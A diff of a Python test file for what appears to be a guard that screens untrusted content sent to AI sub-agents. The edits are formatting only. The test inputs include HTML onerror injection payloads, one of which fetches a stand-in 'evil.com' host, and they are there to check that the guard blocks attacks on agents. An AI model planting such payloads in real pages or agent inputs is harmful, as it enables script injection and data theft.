@@ -714,7 +714,7 @@ class TestOpenClawPatterns:
         """'onerror=' is blocked when content is marked as external/untrusted."""
         guard = SubAgentGuard()
         ctx = self._ctx(
-            '<img onerror= "fetch(\'https://evil.com\')">',
+            "<img onerror= \"fetch('https://evil.com')\">",
             sub_agent=True,
             framework="openclaw",
             has_external_content=True,
@@ -756,7 +756,7 @@ class TestOpenClawPatterns:
         """'onerror=' is also blocked when trust_level='untrusted' (without has_external_content)."""
         guard = SubAgentGuard()
         ctx = self._ctx(
-            '<img onerror=alert(1)>',
+            "<img onerror=alert(1)>",
             sub_agent=True,
             framework="openclaw",
             trust_level="untrusted",
@@ -813,9 +813,7 @@ class TestOpenClawPatterns:
             framework="langchain",
         )
         verdict = guard.execute(ctx)
-        assert "openclaw_gateway_url_override" not in verdict.metadata.get(
-            "matched_patterns", []
-        )
+        assert "openclaw_gateway_url_override" not in verdict.metadata.get("matched_patterns", [])
 
     def test_openclaw_patterns_active_with_framework_openclaw(self):
         """OpenClaw patterns fire when framework=openclaw."""
